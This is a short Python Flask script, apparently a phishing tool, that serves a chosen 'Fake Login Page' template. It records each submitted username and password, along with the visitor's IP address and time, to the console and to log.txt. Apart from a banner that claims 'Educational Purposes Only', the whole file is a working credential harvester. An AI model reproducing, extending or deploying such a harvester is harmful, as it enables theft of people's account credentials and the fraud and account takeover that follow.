from flask import Flask, request, send_from_directory
from datetime import datetime
import logging, os

# -------- Colors --------
red='\033[1;31m'
grn='\033[1;32m'
ylo='\033[1;33m'
cyan='\033[1;36m'
pink='\033[1;35m'
reset='\033[0m'

# -------- Suppress default Flask logs --------
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# -------- Banner --------
def banner():
    os.system("clear")
    print(f"""{red}
██████╗ ██████╗  ██████╗     {cyan}██████╗ 
██╔══██╗██╔══██╗██╔═══██╗    {cyan}██╔══██╗
██████╔╝██████╔╝██║   ██║    {cyan}██████╔╝
██╔═══╝ ██╔═══╝ ██║   ██║    {cyan}██╔═══╝ 
██║     ██║     ╚██████╔╝    {cyan}██║     
╚═╝     ╚═╝      ╚═════╝     {cyan}╚═╝     
{reset}""")
    print(f"{pink}══════════════════════════════════════{reset}")
    print(f"{ylo} PRO D  |  Made by Dhani")
    print(f" {red}⚠ Educational Purposes Only ⚠{reset}")
    print(f"{pink}══════════════════════════════════════{reset}\n")

# -------- Flask App --------
app = Flask(__name__)
selected_html = "1.html"

@app.route('/')
def home():
    return send_from_directory(".", selected_html)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    ip = request.remote_addr
    t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"""{grn}
╔════════════════════════════════════╗
║ {cyan} NEW LOGIN DETECTED
╠════════════════════════════════════╣
║ Username : {ylo}{username}{grn}
║ Password : {ylo}{password}{grn}
║ Time     : {ylo}{t}{grn}
║ IP       : {ylo}{ip}{grn}
╚════════════════════════════════════╝
{reset}""")

    with open("log.txt", "a") as f:
        f.write(f"{username}|{password}|{t}|{ip}\n")

    return "<h2>✅ Login Recorded</h2><p>You may close this page.</p>"

# -------- Run --------
if __name__ == "__main__":
    banner()
    print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Choose Login Template{pink}         ║
╠══════════════════════════════╣
║ [1] Fake Login Page One       ║
║ [2] Fake Login Page Two       ║
╚══════════════════════════════╝
{reset}""")

    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
    selected_html = "1.html" if choice == "1" else "2.html"

    print(f"""{grn}
╔═══════════════════════════════════╗
║ {cyan}LOCAL SERVER RUNNING...             {grn}║
╠═══════════════════════════════════╣
║ Open this in browser: {ylo}http://127.0.0.1:8080{grn} ║
╚═══════════════════════════════════╝
{reset}""")

    app.run(host="127.0.0.1", port=8080, debug=False)
